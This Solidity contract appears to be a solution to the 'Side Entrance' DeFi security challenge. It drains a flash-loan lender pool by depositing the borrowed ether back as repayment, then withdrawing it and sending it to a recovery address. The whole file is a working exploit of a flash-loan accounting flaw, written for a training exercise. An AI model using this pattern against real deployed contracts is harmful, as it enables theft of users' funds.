pragma solidity =0.8.25;

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract AttackerSideEntrance {
    SideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function callFlashLoan(address recovery) public {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool success,) = recovery.call{value: address(this).balance}("");
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    fallback() external payable {}
}
